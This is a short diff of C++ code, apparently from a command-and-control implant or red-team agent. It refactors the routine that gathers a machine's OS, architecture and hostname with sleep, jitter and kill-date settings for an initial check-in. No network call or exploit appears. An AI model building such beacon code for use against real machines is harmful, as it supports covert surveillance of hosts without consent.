@@ -38,9 +38,9 @@ std::wstring GetInitialInfo()
     std::wstring wOS = L"windows";
     std::wstring wArch = L"";
     std::wstring wHostname = L"";
-	std::wstring wSleep = ConvertStringToWstring(std::to_string(PAYLOAD_SLEEP));
-	std::wstring wJitter = ConvertStringToWstring(std::to_string(PAYLOAD_JITTER));
-	std::wstring wKillDate = ConvertStringToWstring(std::to_string(PAYLOAD_KILLDATE));
+	std::wstring wSleep = UTF8Decode(std::to_string(PAYLOAD_SLEEP));
+	std::wstring wJitter = UTF8Decode(std::to_string(PAYLOAD_JITTER));
+	std::wstring wKillDate = UTF8Decode(std::to_string(PAYLOAD_KILLDATE));
 
     // Get architecture
     SYSTEM_INFO systemInfo;
@@ -53,8 +53,8 @@ std::wstring GetInitialInfo()
 	{
 		char szHostname[256] = "";
 		gethostname(szHostname, 256);
-		std::string sHostname = std::string(szHostname, 256);
-		wHostname = ConvertStringToWstring(sHostname);
+		std::string sHostname(szHostname);
+		wHostname = UTF8Decode(sHostname);
 	}
 
 	std::wstring wJson = L"{";
